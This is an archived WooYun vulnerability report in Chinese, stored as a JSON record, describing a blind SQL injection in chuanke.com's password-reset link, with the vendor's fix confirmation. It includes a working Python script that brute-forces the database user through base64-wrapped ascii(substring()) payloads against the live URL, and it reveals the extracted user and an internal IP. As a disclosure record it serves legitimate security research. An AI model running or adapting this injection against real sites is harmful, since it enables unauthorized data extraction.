{"id": 37682, "wybug_id": "wooyun-2015-099151", "wybug_title": "传课网某处sql 盲注漏洞", "wybug_corp": "chuanke.com", "wybug_author": "1c3z", "wybug_date": "2015-03-03 17:49", "wybug_open_date": "2015-04-14 17:06", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-14：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 好像被百度收购了，所以厂商就选了百度了 详细说明：  注入点在找回密码的地方，要老帐号才有这个\n\nbase64 decode得8ff1a72c16885打码639e134c0a11|1232486|邮箱名打码@qq.com|1425275302|6277最后面得6277可控  加'号报错poc s/后面的要进行base64 encodehttp://passport.chuanke.com/passwd/reset/s/8ff1a72c16885打码639e134c0a11|1232486|邮箱名打码@qq.com|1425275302|6277' and length(user())=17 正确页面写了个脚本爆破了下user()\n#!/usr/bin/env python# -*- coding: utf-8 -*-#__author__ = '1c3z'import urllib2import base64url = 'http://passport.chuanke.com/passwd/reset/s/'data = '8ff1a72c16885打码639e134c0a11|1232486|邮箱名打码@qq.com|1425275302|6277'user = \"\"try:\tfor x in xrange(1,18):\t\tcnt = 30 \t\tprint x\t\twhile True:\t\t\ttry:\t\t\t\tif cnt > 130:\t\t\t\t\tbreak\t\t\t\turl = 'http://passport.chuanke.com/passwd/reset/s/'\t\t\t\tpayload = \"' and ascii(substring(user(),\"+str(x)+\",1))=\" + str(cnt) + \"#\"\t\t\t\turl += base64.b64encode(data + payload)\t\t\t\tf = urllib2.urlopen(url,timeout=3)\t\t\t\tres = f.read()\t\t\t\tif res.find('验证失败，链接已失效！') == -1:\t\t\t\t\tprint \"find:\" +str(x) +\":\"+str(cnt)\t\t\t\t\tuser += str(chr(cnt))\t\t\t\t\tbreak\t\t\t\tcnt +=1\t\t\texcept Exception, e:\t\t\t\tprint \"timed out\"\tprint userexcept urllib2.HTTPError, e:\tprint \"error\"\n   漏洞证明：  最后爆破出user()kkapp@10.67.41.43   修复方案：  过滤   版权声明：转载请注明来源 1c3z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-03-04 11:47 厂商回复： 感谢提醒!目前已经着手处理中......也欢迎各位大神来百度传课开设相关技术课程！ 最新状态： 2015-04-14：已经修复，感谢@1c3z 的及时发现并提醒。百度传课是中国教育领域新兴的在线教育平台，致力于用互联网的方式来打破中国教育资源地域分布的不平衡，精心打造在线课程发布网站、直播互动教室，提供在线直播互动的一站式全方位的专业教育服务。非常欢迎各位大神前来开设相关安全和技术类课程！  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}